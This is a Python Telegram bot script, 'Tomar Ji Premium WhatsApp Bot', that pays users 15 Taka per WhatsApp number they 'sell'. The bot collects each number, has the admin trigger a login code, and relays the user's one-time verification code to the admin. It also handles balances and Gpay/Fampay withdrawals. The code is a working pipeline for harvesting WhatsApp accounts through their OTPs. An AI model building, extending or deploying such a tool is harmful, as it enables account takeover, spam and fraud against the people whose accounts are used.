#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
from datetime import datetime
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)

# === CONFIG ===
ADMIN_ID = ENTER YOUR CHAT ID 
BOT_TOKEN = "ENTER YOUR BOT TOKEN"  # ⚠️ regenerate from BotFather
BACKGROUND_IMAGE_PATH = "i.jpg"
DATA_FILE = "users.json"

# In-memory per-user "state" so admin actions can set a target user's expected step.
# This persists only while the bot process is running.
user_states = {}  # { user_id(int): {"step": "...", "number": "...", ...} }


# === UTILITIES ===
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}


def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)


def ensure_user(user_id: int):
    d = load_data()
    key = str(user_id)
    if key not in d:
        d[key] = {"balance": 0, "numbers": []}
        save_data(d)


def append_number(user_id: int, number: str, status: str):
    """
    user_id: int
    number: string
    status: string
    """
    ensure_user(user_id)
    d = load_data()
    d_key = str(user_id)
    d[d_key]["numbers"].append({"number": number, "status": status})
    save_data(d)


# === COMMAND HANDLER ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user(user_id)

    keyboard = [
        [KeyboardButton("📲 Sell Number")],
        [KeyboardButton("💳 My Balance"), KeyboardButton("📜 My All Number")],
        [KeyboardButton("🆘 Support"), KeyboardButton("💵 Withdraw")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    # Send photo if exists, else text only
    caption = "✨ Welcome to Tomar Ji Premium WhatsApp Bot!"
    if os.path.exists(BACKGROUND_IMAGE_PATH):
        with open(BACKGROUND_IMAGE_PATH, "rb") as ph:
            await update.message.reply_photo(
                photo=ph,
                caption=caption,
                reply_markup=reply_markup
            )
    else:
        await update.message.reply_text(
            caption,
            reply_markup=reply_markup
        )


# === MESSAGE HANDLER ===
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    text = update.message.text.strip()
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or "User"

    ensure_user(user_id)

    # prefer transient in-memory state (used for admin-driven steps)
    state = user_states.get(user_id, {}).get("step")
    # fallback to per-chat context (still used for withdraw flow)
    ctx_step = context.user_data.get("step")

    # ----- SELL NUMBER (start) -----
    if text == "📲 Sell Number":
        # track that user should send number next
        user_states[user_id] = {"step": "wait_number"}
        await update.message.reply_text("✉️ Enter your WhatsApp number (without +):")
        return

    # ----- WAITING FOR NUMBER -----
    if state == "wait_number":
        number = text
        user_states[user_id] = {"step": None}  # clear state (we've sent to admin)
        # send to admin for verification with action buttons
        keyboard = [
            [
                InlineKeyboardButton("Send Code", callback_data=f"send_code|{user_id}|{number}"),
                InlineKeyboardButton("Reject", callback_data=f"reject_number|{user_id}|{number}")
            ]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📋 New number received\n👤 User: @{username}\n📞 Number: {number}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        await update.message.reply_text("✅ Your number has been submitted for verification.")
        return

    # ----- WAITING FOR OTP -----
    if state == "wait_otp":
        otp = text
        target_number = user_states[user_id].get("number")
        # send OTP to admin for decision
        keyboard = [
            [
                InlineKeyboardButton(
                    "✅ Accept",
                    callback_data=f"accept_number|{user_id}|{target_number}|{otp}"
                ),
                InlineKeyboardButton(
                    "❌ Reject",
                    callback_data=f"reject_number|{user_id}|{target_number}"
                ),
                InlineKeyboardButton(
                    "🔁 Retry",
                    callback_data=f"retry_number|{user_id}|{target_number}"
                )
            ]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📋 OTP Received\n👤 User: @{username}\n📞 Number: {target_number}\n🔐 Code: {otp}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        # clear state for the user (admin will accept/reject)
        user_states[user_id] = {"step": None}
        await update.message.reply_text("✅ OTP forwarded to admin for verification.")
        return

    # ----- BALANCE -----
    if text == "💳 My Balance":
        data = load_data()
        balance = data.get(str(user_id), {}).get("balance", 0)
        await update.message.reply_text(f"💸 Your balance is: {balance} Taka")
        return

    # ----- HISTORY -----
    if text == "📜 My All Number":
        data = load_data()
        numbers = data.get(str(user_id), {}).get("numbers", [])
        if not numbers:
            await update.message.reply_text("No numbers found.")
        else:
            msg = f"📋 {username} — All Number History:\n\n"
            for entry in numbers:
                msg += f"📞 {entry['number']} — {entry['status']}\n"
            await update.message.reply_text(msg)
        return

    # ----- SUPPORT -----
    if text == "🆘 Support":
        await update.message.reply_text("💬 Contact: @tomar_ji_99")
        return

    # ----- WITHDRAW (start) -----
    if text == "💵 Withdraw":
        keyboard = [[
            InlineKeyboardButton("Gpay", callback_data="withdraw_gpay"),
            InlineKeyboardButton("Fampay", callback_data="withdraw_fampay")
        ]]
        await update.message.reply_text("Select payment method 👇", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    # Withdraw steps use per-chat context.user_data (they're user-driven in same chat)
    if ctx_step == "withdraw_number":
        context.user_data["withdraw_number"] = text
        context.user_data["step"] = "withdraw_amount"
        await update.message.reply_text("💰 Enter withdraw amount:")
        return

    if ctx_step == "withdraw_amount":
        try:
            amount = int(text)
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number.")
            return

        d = load_data()
        bal = d.get(str(user_id), {}).get("balance", 0)

        if amount < 150 or amount > bal:
            await update.message.reply_text("❌ Minimum withdraw 150 Taka or insufficient balance.")
            context.user_data["step"] = None
            return

        number = context.user_data.get("withdraw_number")
        method = context.user_data.get("withdraw_method")
        dt = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        admin_msg = (
            "📥 *New Withdraw Request*\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: {user_id}\n"
            f"💳 Method: {method}\n"
            f"📞 Number: {number}\n"
            f"💰 Amount: {amount}\n"
            f"🕓 Date: {dt}"
        )

        keyboard = [
            [
                InlineKeyboardButton("✅ Success", callback_data=f"withdraw_success|{user_id}|{amount}"),
                InlineKeyboardButton("❌ Failed", callback_data=f"withdraw_failed|{user_id}")
            ]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard)
        )
        await update.message.reply_text("✅ Withdraw request sent! Admin will process it.")
        context.user_data["step"] = None
        return

    # any other text -> ignore or reply
    # optional: echo or show help
    # await update.message.reply_text("I didn't understand that. Use the keyboard options.")


# === CALLBACK HANDLER ===
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()
    parts = query.data.split("|")
    action = parts[0]

    # --- Admin clicked "Send Code" for a submitted number ---
    if action == "send_code":
        # parts: send_code|<user_id>|<number>
        target_user_id = int(parts[1])
        number = parts[2]
        # set state for the target user so their next message will be treated as OTP
        user_states[target_user_id] = {"step": "wait_otp", "number": number}
        await context.bot.send_message(chat_id=target_user_id, text="🔐 Enter your verification code:")
        await query.message.reply_text(f"✅ Asked user {parts[1]} to send OTP.")
        return

    # --- Admin rejected the number (notify user) ---
    if action == "reject_number":
        target_user_id = int(parts[1])
        await context.bot.send_message(chat_id=target_user_id, text="❌ Your number was rejected by admin.")
        await query.message.reply_text(f"Rejected user {parts[1]}.")
        return

    # --- Admin asked to retry ---
    if action == "retry_number":
        target_user_id = int(parts[1])
        await context.bot.send_message(chat_id=target_user_id, text="🔁 Verification failed, please try again.")
        await query.message.reply_text(f"Asked user {parts[1]} to retry.")
        return

    # --- Admin accepted the number and provided OTP (parts: accept_number|user_id|number|otp) ---
    if action == "accept_number":
        # parts: accept_number|<user_id>|<number>|<otp>
        target_user_id = int(parts[1])
        number = parts[2]
        # add number record and add balance
        append_number(target_user_id, number, "✅ Verified")
        d = load_data()
        key = str(target_user_id)
        if key not in d:
            d[key] = {"balance": 0, "numbers": []}
        # credit 15 Taka
        d[key]["balance"] = d[key].get("balance", 0) + 15
        save_data(d)
        await context.bot.send_message(chat_id=target_user_id,
                                       text="🎉 Your number was accepted! 15 Taka added to your account.")
        await query.message.reply_text(f"User {target_user_id} credited and notified.")
        return

    # --- Withdraw method chosen by user (in their chat) ---
    if action in ["withdraw_gpay", "withdraw_fampay"]:
        method = action.split("_", 1)[1]  # gpay or fampay
        # This callback is in user's chat, so context.user_data belongs to that user
        context.user_data["withdraw_method"] = method
        context.user_data["step"] = "withdraw_number"
        await query.message.reply_text(f"📱 Enter your {method} number:")
        return

    # --- Admin marks withdraw success ---
    if action == "withdraw_success":
        # parts: withdraw_success|<user_id>|<amount>
        user_id = int(parts[1])
        amount = int(parts[2])
        d = load_data()
        key = str(user_id)
        if key not in d:
            # defensive: create entry if missing
            d[key] = {"balance": 0, "numbers": []}
        d[key]["balance"] = d[key].get("balance", 0) - amount
        if d[key]["balance"] < 0:
            d[key]["balance"] = 0  # don't allow negative (optional)
        save_data(d)
        await context.bot.send_message(chat_id=user_id,
                                       text=f"✅ Your withdraw of {amount} Taka was successful!")
        await query.message.reply_text(f"Marked withdraw success for {user_id}.")
        return

    # --- Admin marks withdraw failed ---
    if action == "withdraw_failed":
        user_id = int(parts[1])
        await context.bot.send_message(chat_id=user_id,
                                       text="❌ Your withdraw request failed. Please contact support.")
        await query.message.reply_text(f"Marked withdraw failed for {user_id}.")
        return


# === MAIN ===
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(handle_callback))

    print("🤖 Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()

